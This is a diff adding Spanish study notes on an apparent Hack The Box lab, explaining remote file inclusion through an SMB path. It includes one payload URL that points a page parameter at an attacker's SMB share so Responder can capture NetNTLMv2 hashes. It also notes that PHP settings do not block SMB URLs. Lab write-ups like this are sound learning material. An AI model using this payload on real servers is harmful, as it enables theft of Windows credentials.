@@ -74,9 +74,15 @@ john the ripper
 
 
 https://github.com/lgandx/Responder
-
-
-
+http://unika.htb/index.php?page=//10.10.15.208/somefile 
+Con el servidor Responder listo, le decimos al servidor que incluya un recurso de nuestro servidor SMB configurando
+el parámetro de la página de la siguiente manera a través del navegador web.
+En este caso, debido a que tenemos la libertad de especificar la dirección para el recurso compartido SMB, especificamos la IP
+dirección de nuestra máquina atacante. Ahora el servidor intenta cargar el recurso desde nuestro servidor SMB y
+Responder captura suficiente de eso para obtener NetNTLMv2.
+En el archivo de configuración de PHP php.ini, el envoltorio "allow_url_include" está configurado en "Desactivado" de forma predeterminada, lo que indica que
+PHP no carga URL HTTP o FTP remotas para evitar ataques de inclusión de archivos remotos. Sin embargo, incluso si
+allow_url_include y allow_url_fopen están configurados en "Off", PHP no evitará la carga de URL de SMB
 
 
 
